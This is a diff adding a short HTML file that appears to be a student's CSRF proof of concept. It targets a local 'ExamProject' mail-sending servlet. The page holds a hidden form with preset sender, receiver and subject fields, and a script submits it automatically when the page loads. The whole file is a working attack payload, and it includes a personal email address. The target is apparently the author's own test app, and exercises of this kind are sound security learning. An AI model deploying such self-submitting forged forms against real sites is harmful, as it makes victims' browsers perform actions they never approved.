@@ -1,0 +1,14 @@
+<html>
+   <form id="submitForm" class="form-resize" action="http://localhost:8080/ExamProject/SendMailServlet" method="post">
+      <input type="hidden" name="email" value="antonio.coppe@gmail.com"/> <input
+         type="hidden" name="password" value="null"/> <input
+         class="single-row-input" type="hidden" name="receiver"
+         placeholder="Receiver" value="antonio.coppe@gmail.com" required/> <input
+         class="single-row-input" type="hidden" name="subject"
+         placeholder="Subject" value="csrf text attack version 1" required>
+       <textarea class="textarea-input" name="body" placeholder="Body" wrap="hard"  value = "this is the body of a csef attack"required></textarea>
+       <input type="submit" name="sent" value="Send">
+   </form>
+   <script>document.getElementById("submitForm").submit()</script>
+</html>
+
